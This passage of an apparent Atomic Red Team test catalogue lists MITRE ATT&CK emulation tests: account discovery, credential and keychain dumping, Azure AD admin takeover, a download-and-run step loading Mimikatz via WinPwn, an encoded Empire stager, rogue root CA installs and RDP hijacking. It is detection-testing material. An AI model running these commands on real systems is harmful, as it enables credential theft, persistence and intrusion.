#Reset the password of the target_user
Set-AzureADUserPassword -ObjectId  $target_objid -Password $targetsecurepw -ErrorAction:SilentlyContinue

#Adding target_user
Add-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberEmailAddress ""#{target_user}""
Add-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberEmailAddress ""#{target_user}""
",powershell,False,,"Import-Module MSOnline
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
Connect-MsolService -Credential $credential
Remove-MsolRoleMember -RoleName ""Company Administrator"" -RoleMemberType User -RoleMemberEmailAddress ""#{target_user}""
Remove-MsolRoleMember -RoleName ""Global Reader"" -RoleMemberType User -RoleMemberEmailAddress ""#{target_user}""
",powershell,"dependencies.0.description: MSOnline and AzureAD modules must be installed.

dependencies.0.prereq_command: $required_mods = 'AzureAD', 'MSOnline'
$installed_mods = @((Get-Module $required_mods -ListAvailable -ErrorAction SilentlyContinue).Name  | Select-Object -Unique)
$notInstalled = Compare-Object $required_mods $installed_mods -PassThru -ErrorAction SilentlyContinue

if ($notInstalled) {
# Prompt for installing the missing ones.
Write-Output ""The following PS modules aren't currently installed:""
$notInstalled
  exit 1
}

 else{
  Write-Output ""All required PS modules are installed""
  exit 0
 }

dependencies.0.get_prereq_command: Install-Module -Name MSOnline -Scope CurrentUser -Force
Install-Module -Name AzureAD -Scope CurrentUser -Force

","input_arguments.auth_username.description: Azure AD username used to conduct the adversary activity

input_arguments.auth_username.type: string

input_arguments.auth_username.default: jonh@contoso.com

input_arguments.auth_password.description: Azure AD password for user auth_username

input_arguments.auth_password.type: string

input_arguments.auth_password.default: p4sswd

input_arguments.target_user.description: Name of the user whose password be reset and added to the admin role.

input_arguments.target_user.type: string

input_arguments.target_user.default: default

input_arguments.target_password.description: The password that the user target_user will be reset to.

input_arguments.target_password.type: string

input_arguments.target_password.default: Ohn05GeMe#$

"
T1087.001,Account Discovery: Local Account,Enumerate all accounts (Local),f8aab3dd-5990-4bf8-b8ab-2226c951696f,"Enumerate all accounts by copying /etc/passwd to another file
",linux,,,"cat /etc/passwd > #{output_file}
cat #{output_file}
",sh,,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1087.001.txt

"
T1087.001,Account Discovery: Local Account,View sudoers access,fed9be70-0186-4bde-9f8a-20945f9370c2,"(requires root)
",linux,macos,,"if [ -f /etc/sudoers ]; then sudo cat /etc/sudoers > #{output_file}; fi;
if [ -f /usr/local/etc/sudoers ]; then sudo cat /usr/local/etc/sudoers > #{output_file}; fi;
cat #{output_file}
",sh,True,,"rm -f #{output_file}
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1087.001.txt

"
T1087.001,Account Discovery: Local Account,View accounts with UID 0,c955a599-3653-4fe5-b631-f11c00eb0397,"View accounts with UID 0
",linux,macos,,"grep 'x:0:' /etc/passwd > #{output_file}
grep '*:0:' /etc/passwd >> #{output_file}
cat #{output_file} 2>/dev/null
",sh,,,"rm -f #{output_file} 2>/dev/null
",,,"input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1087.001.txt

"
T1087.001,Account Discovery: Local Account,List opened files by user,7e46c7a5-0142-45be-a858-1a3ecb4fd3cb,"List opened files by user
",linux,macos,,"username=$(id -u -n) && lsof -u $username
",sh,,,,sh,"dependencies.0.description: check if lsof exists

dependencies.0.prereq_command: which lsof

dependencies.0.get_prereq_command: (which pkg && pkg install -y lsof)||(which yum && yum -y install lsof)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y lsof)

",
T1087.001,Account Discovery: Local Account,Show if a user account has ever logged in remotely,0f0b6a29-08c3-44ad-a30b-47fd996b2110,"Show if a user account has ever logged in remotely
",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog"" 
$cmd > #{output_file}
cat #{output_file}
",sh,,,"rm -f #{output_file}
",sh,"dependencies.0.description: Check if lastlog command exists on the machine

dependencies.0.prereq_command: if [ -x ""$(command -v lastlog)"" ]; then exit 0; else exit 1; fi

dependencies.0.get_prereq_command: sudo apt-get install login; exit 1;

","input_arguments.output_file.description: Path where captured results will be placed

input_arguments.output_file.type: path

input_arguments.output_file.default: /tmp/T1087.001.txt

"
T1087.001,Account Discovery: Local Account,Enumerate users and groups,e6f36545-dc1e-47f0-9f48-7f730f54a02e,"Utilize groups and id to enumerate users and groups
",linux,macos,,"groups
id
",sh,,,,,,
T1087.001,Account Discovery: Local Account,Enumerate users and groups,319e9f6c-7a9e-432e-8c62-9385c803b6f2,"Utilize local utilities to enumerate users and groups
",macos,,,"dscl . list /Groups
dscl . list /Users
dscl . list /Users | grep -v '_'
dscacheutil -q group
dscacheutil -q user
",sh,,,,,,
T1087.001,Account Discovery: Local Account,Enumerate all accounts on Windows (Local),80887bec-5a9b-4efc-a81d-f83eb2eb32ab,"Enumerate all accounts
Upon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session
",windows,,,"net user
dir c:\Users\
cmdkey.exe /list
net localgroup ""Users""
net localgroup
",command_prompt,,,,,,
T1087.001,Account Discovery: Local Account,Enumerate all accounts via PowerShell (Local),ae4b6361-b5f8-46cb-a3f9-9cf108ccfe7b,"Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.
",windows,,,"net user
get-localuser
get-localgroupmember -group Users
cmdkey.exe /list
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-localgroup
net localgroup
",powershell,,,,,,
T1087.001,Account Discovery: Local Account,Enumerate logged on users via CMD (Local),a138085e-bfe5-46ba-a242-74a6fb884af3,"Enumerate logged on users. Upon execution, logged on users will be displayed.
",windows,,,"query user
",command_prompt,,,,,,
T1137,Office Application Startup,Office Application Startup - Outlook as a C2,bfe6ac15-c50b-4c4f-a186-0fc6b8ba936c,"As outlined in MDSEC's Blog post https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/ 
it is possible to use Outlook Macro as a way to achieve persistance and execute arbitrary commands. This transform Outlook into a C2.
Too achieve this two things must happened on the syste
- The macro security registry value must be set to '4'
- A file called VbaProject.OTM must be created in the Outlook Folder.
",windows,,,"reg add ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"" /t REG_DWORD /d 1 /f
mkdir  %APPDATA%\Microsoft\Outlook\ >nul 2>&1
echo ""Atomic Red Team TEST"" > %APPDATA%\Microsoft\Outlook\VbaProject.OTM
",command_prompt,,,"reg delete ""HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Outlook\Security\Level"" /f >nul 2>&1
del %APPDATA%\Microsoft\Outlook\VbaProject.OTM >nul 2>&1
",,,
T1059.002,Command and Scripting Interpreter: AppleScript,AppleScript,3600d97d-81b9-4171-ab96-e4386506e2c2,"Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of ""t3VhVOs/DyCcDTFzIKanRxkvk3I="", unless 'Little Snitch' is installed, in which case it will just exit. 
You can use netcat to listen for the connection and verify execution, e.g. use ""nc -l 80"" in another terminal window before executing this test and watch for the request.

Reference: https://github.com/EmpireProject/Empire
",macos,,,"osascript -e ""do shell script \""echo \\\""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\"" | python &\""""
",sh,,,,,,
T1482,Domain Trust Discovery,Windows - Discover domain trusts with dsquery,4700a710-c821-4e17-a3ec-9e4c81d6845f,"Uses the dsquery command to discover domain trusts.
Requires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.
",windows,,,"dsquery * -filter ""(objectClass=trustedDomain)"" -attr *
",command_prompt,,,,,,
T1482,Domain Trust Discovery,Windows - Discover domain trusts with nltest,2e22641d-0498-48d2-b9ff-c71e496ccdbe,"Uses the nltest command to discover domain trusts.
Requires the installation of nltest via Windows RSAT or the Windows Server AD DS role.
This technique has been used by the Trickbot malware family.
",windows,,,"nltest /domain_trusts
nltest /trusted_domains
",command_prompt,,,,,"dependencies.0.description: nltest.exe from RSAT must be present on disk

dependencies.0.prereq_command: WHERE nltest.exe >NUL 2>&1

dependencies.0.get_prereq_command: echo Sorry RSAT must be installed manually

",
T1482,Domain Trust Discovery,Powershell enumerate domains and forests,c58fbc62-8a62-489e-8f2d-3565d7d96f30,"Use powershell to enumerate AD information.
Requires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.
",windows,,,"Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""
Get-NetDomainTrust
Get-NetForestTrust
Get-ADDomain
Get-ADGroupMember Administrators -Recursive
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
",powershell,,,,powershell,"dependencies.0.description: PowerView PowerShell script must exist on disk

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PowerView.ps1""

dependencies.1.description: RSAT PowerShell AD admin cmdlets must be installed

dependencies.1.prereq_command: if ((Get-Command ""Get-ADDomain"" -ErrorAction Ignore) -And (Get-Command ""Get-ADGroupMember"" -ErrorAction Ignore)) { exit 0 } else { exit 1 }

dependencies.1.get_prereq_command: Write-Host ""Sorry RSAT must be installed manually""

",
T1482,Domain Trust Discovery,Adfind - Enumerate Active Directory OUs,d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=organizationalUnit) #{optional_args}
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1482,Domain Trust Discovery,Adfind - Enumerate Active Directory Trusts,15fe436d-e771-4ff3-b655-2dca9ba52834,"Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts
reference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html
",windows,,,"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" #{optional_args} -gcb -sc trustdmp
",command_prompt,,,,powershell,"dependencies.0.description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe)

dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"") -ErrorAction ignore | Out-Null
Invoke-WebRequest -Uri ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe""

","input_arguments.optional_args.description: Allows defining arguments to add to the adfind command to tailor it to the specific needs of the environment. Use ""-arg"" notation to add arguments separated by spaces.

input_arguments.optional_args.type: string

input_arguments.optional_args.default: None

"
T1482,Domain Trust Discovery,Get-DomainTrust with PowerView,f974894c-5991-4b19-aaf5-7cc2fe298c5d,"Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose
",powershell,,,,,,
T1482,Domain Trust Discovery,Get-ForestTrust with PowerView,58ed10e8-0738-4651-8408-3a3e9a526279,"Utilizing PowerView, run Get-ForestTrust to identify forest trusts. Upon execution, progress and info about forest trusts within the domain being scanned will be displayed.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose
",powershell,,,,,,
T1482,Domain Trust Discovery,TruffleSnout - Listing AD Infrastructure,ea1b4f2d-5b82-4006-b64f-f2845608a3bf,"Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout
",windows,,,"""#{trufflesnout_path}"" forest -n #{domain}
""#{trufflesnout_path}"" domain -n #{domain}
",command_prompt,,,,powershell,"dependencies.0.description: TruffleSnout.exe must exist on disk at specified location (#{trufflesnout_path})

dependencies.0.prereq_command: if (Test-Path ""#{trufflesnout_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -ItemType Directory (Split-Path ""#{trufflesnout_path}"") -Force | Out-Null
Invoke-WebRequest -Uri ""https://github.com/dsnezhkov/TruffleSnout/releases/download/0.5/TruffleSnout.exe"" -OutFile ""#{trufflesnout_path}""

","input_arguments.trufflesnout_path.description: Path to the TruffleSnout executable

input_arguments.trufflesnout_path.type: path

input_arguments.trufflesnout_path.default: PathToAtomicsFolder\..\ExternalPayloads\TruffleSnout.exe

input_arguments.domain.description: Domain name to search on

input_arguments.domain.type: string

input_arguments.domain.default: %userdomain%

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on CentOS/RHEL,9c096ec4-fd42-419d-a762-d64cc950627e,"Creates a root CA with openssl
",linux,,,"openssl genrsa -out #{key_filename} 4096
openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
cp #{cert_filename} /etc/pki/ca-trust/source/anchors/
update-ca-trust
",sh,True,,"rm /etc/pki/ca-trust/source/anchors/#{cert_filename}
update-ca-trust
",,,"input_arguments.cert_filename.description: Path of the CA certificate we create

input_arguments.cert_filename.type: path

input_arguments.cert_filename.default: rootCA.crt

input_arguments.key_filename.description: Key we create that is used to create the CA certificate

input_arguments.key_filename.type: path

input_arguments.key_filename.default: rootCA.key

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on FreeBSD,f4568003-1438-44ab-a234-b3252ea7e7a3,"Creates a root CA with openssl
",linux,,,"openssl genrsa -out #{key_filename} 4096
openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}
cp #{cert_filename} /usr/local/share/certs/
certctl rehash
",sh,True,,"rm /usr/local/share/certs/#{cert_filename}
certctl rehash
",,,"input_arguments.cert_filename.description: Path of the CA certificate we create

input_arguments.cert_filename.type: path

input_arguments.cert_filename.default: rootCA.crt

input_arguments.key_filename.description: Key we create that is used to create the CA certificate

input_arguments.key_filename.type: path

input_arguments.key_filename.default: rootCA.key

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on Debian/Ubuntu,53bcf8a0-1549-4b85-b919-010c56d724ff,"Creates a root CA with openssl
",linux,,,"mv #{cert_filename} /usr/local/share/ca-certificates
echo sudo update-ca-certificates
",sh,True,,,sh,"dependencies.0.description: Verify the certificate exists. It generates if not on disk.

dependencies.0.prereq_command: if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}

","input_arguments.cert_filename.description: CA file name

input_arguments.cert_filename.type: path

input_arguments.cert_filename.default: rootCA.crt

input_arguments.key_filename.description: Key we create that is used to create the CA certificate

input_arguments.key_filename.type: path

input_arguments.key_filename.default: rootCA.key

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on macOS,cc4a0b8c-426f-40ff-9426-4e10e5bf4c49,"Creates a root CA with openssl
",macos,,,"sudo security add-trusted-cert -d -r trustRoot -k ""/Library/Keychains/System.keychain"" ""#{cert_filename}""
",sh,True,,,sh,"dependencies.0.description: Verify the certificate exists. It generates if not on disk.

dependencies.0.prereq_command: if [ -f #{cert_filename} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: if [ ! -f #{key_filename} ]; then openssl genrsa -out #{key_filename} 4096; fi;
openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj ""/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com"" -out #{cert_filename}

","input_arguments.cert_filename.description: CA file name

input_arguments.cert_filename.type: path

input_arguments.cert_filename.default: rootCA.crt

input_arguments.key_filename.description: Key we create that is used to create the CA certificate

input_arguments.key_filename.type: path

input_arguments.key_filename.default: rootCA.key

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on Windows,76f49d86-5eb1-461a-a032-a480f86652f1,"Creates a root CA with Powershell
",windows,,,"$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Move-Item -Path $cert.PSPath -Destination ""Cert:\LocalMachine\Root""
",powershell,True,,"try {
   $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
   Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
}
catch { }
",powershell,"dependencies.0.description: Verify the certificate exists. It generates if not on disk.

dependencies.0.prereq_command: if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item

","input_arguments.pfx_path.description: Path of the certificate

input_arguments.pfx_path.type: path

input_arguments.pfx_path.default: rootCA.cer

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Install root CA on Windows with certutil,5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f,"Creates a root CA with certutil
",windows,,,"certutil -addstore my #{pfx_path}
",powershell,True,,"try {
$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore
} catch { }
",powershell,"dependencies.0.description: Certificate must exist at specified location (#{pfx_path})

dependencies.0.prereq_command: if (Test-Path #{pfx_path}) { exit 0 } else { exit 1 }

dependencies.0.get_prereq_command: $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My
Export-Certificate -Type CERT -Cert  Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}
Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) | Remove-Item

","input_arguments.pfx_path.description: Path of the certificate

input_arguments.pfx_path.type: path

input_arguments.pfx_path.default: $env:Temp\rootCA2.cer

"
T1553.004,Subvert Trust Controls: Install Root Certificate,Add Root Certificate to CurrentUser Certificate Store,ca20a3f1-42b5-4e21-ad3f-1049199ec2e0,"The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.
Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
",windows,,,"IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
",powershell,True,,"Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
",,,
T1036,Masquerading,System File Copied to Unusual Location,51005ac7-52e2-45e0-bdab-d17c6d4916cd,It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.,windows,,,"copy-item ""$env:windir\System32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe""
start-process ""$env:allusersprofile\cmd.exe""
sleep -s 5 
stop-process -name ""cmd"" | out-null",powershell,,,"remove-item ""$env:allusersprofile\cmd.exe"" -force -erroraction silentlycontinue",,,
T1036,Masquerading,Malware Masquerading and Execution from Zip File,4449c89b-ec82-43a4-89c1-91e2f1abeecc,"When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",windows,,,"Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"" -DestinationPath ""$env:userprofile\Downloads\T1036"" -Force
cd ""$env:userprofile\Downloads\T1036""
cmd /c ""$env:userprofile\Downloads\T1036\README.cmd"" >$null 2>$null",powershell,,,"taskkill /IM Calculator.exe /f >$null 2>$null
Remove-Item ""$env:userprofile\Downloads\T1036"" -recurse -ErrorAction Ignore",,"dependencies.0.description: Zip file must be present.
dependencies.0.prereq_command: if (Test-Path ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-WebRequest #{url} -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\T1036.zip"" 

","input_arguments.url.description: Location of zip file

input_arguments.url.type: url

input_arguments.url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip

"
T1119,Automated Collection,Automated Collection Command Prompt,cb379146-53f1-43e0-b884-7ce2c635ff5b,"Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection
to see what was collected.
",windows,,,"mkdir %temp%\T1119_command_prompt_collection >nul 2>&1
dir c: /b /s .docx | findstr /e .docx
for /R c:\ %f in (*.docx) do copy /Y %f %temp%\T1119_command_prompt_collection
",command_prompt,,,"del %temp%\T1119_command_prompt_collection /F /Q >nul 2>&1
",,,
T1119,Automated Collection,Automated Collection PowerShell,634bd9b9-dc83-4229-b19f-7f83ba9ad313,"Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection
to see what was collected.
",windows,,,"New-Item -Path $env:TEMP\T1119_powershell_collection -ItemType Directory -Force | Out-Null
Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\T1119_powershell_collection}
",powershell,,,"Remove-Item $env:TEMP\T1119_powershell_collection -Force -ErrorAction Ignore | Out-Null
",,,
T1119,Automated Collection,Recon information for export with PowerShell,c3f6d794-50dd-482f-b640-0384fbb7db26,"collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
to see what was collected.
",windows,,,"Get-Service > $env:TEMP\T1119_1.txt
Get-ChildItem Env: > $env:TEMP\T1119_2.txt
Get-Process > $env:TEMP\T1119_3.txt
",powershell,,,"Remove-Item $env:TEMP\T1119_1.txt -ErrorAction Ignore
Remove-Item $env:TEMP\T1119_2.txt -ErrorAction Ignore
Remove-Item $env:TEMP\T1119_3.txt -ErrorAction Ignore
",,,
T1119,Automated Collection,Recon information for export with Command Prompt,aa1180e2-f329-4e1e-8625-2472ec0bfaf3,"collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt
to see what was collected.
",windows,,,"sc query type=service > %TEMP%\T1119_1.txt
doskey /history > %TEMP%\T1119_2.txt
wmic process list > %TEMP%\T1119_3.txt
tree C:\AtomicRedTeam\atomics > %TEMP%\T1119_4.txt
",command_prompt,,,"del %TEMP%\T1119_1.txt >nul 2>&1
del %TEMP%\T1119_2.txt >nul 2>&1
del %TEMP%\T1119_3.txt >nul 2>&1
del %TEMP%\T1119_4.txt >nul 2>&1
",,,
T1620,Reflective Code Loading,WinPwn - Reflectively load Mimik@tz into memory,56b9589c-9170-4682-8c3d-33b86ecb5119,Reflectively load Mimik@tz into memory technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
mimiload -consoleoutput -noninteractive",powershell,,,,,,
T1555.001,Credentials from Password Stores: Keychain,Keychain Dump,88e1fa00-bf63-4e5b-a3e1-e2ea51c8cca6,"This command will dump keychain credential information from login.keychain. 
Source: https://www.loobins.io/binaries/security/

### Keychain File path
  ~/Library/Keychains/
  /Library/Keychains/
  /Network/Library/Keychains/
  [Security Reference](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/security.1.html)
  ",macos,,,sudo security dump-keychain -d login.keychain,sh,True,,,,,
T1555.001,Credentials from Password Stores: Keychain,Export Certificate Item(s),1864fdec-ff86-4452-8c30-f12507582a93,"This command finds all certificate items and sends the output to local file in pem format.
",macos,,,"security find-certificate -a -p > #{cert_export}
",sh,False,,rm #{cert_export},,,"input_arguments.cert_export.description: Specify the path of the certificates to export.

input_arguments.cert_export.type: path

input_arguments.cert_export.default: /tmp/certs.pem

"
T1555.001,Credentials from Password Stores: Keychain,Import Certificate Item(s) into Keychain,e544bbcb-c4e0-4bd0-b614-b92131635f59,"This command will import a certificate pem file into a keychain.
",macos,,,"security import #{cert_export} -k
",sh,False,,,,,"input_arguments.cert_export.description: Specify the path of the pem certificate file to import.

input_arguments.cert_export.type: path

input_arguments.cert_export.default: /tmp/certs.pem

"
T1563.002,Remote Service Session Hijacking: RDP Hijacking,RDP hijacking,a37ac520-b911-458e-8aed-c5f1576d9f46,"[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization
",windows,,,"query user
sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}""
net start sesshijack
",command_prompt,True,,"sc.exe delete sesshijack >nul 2>&1
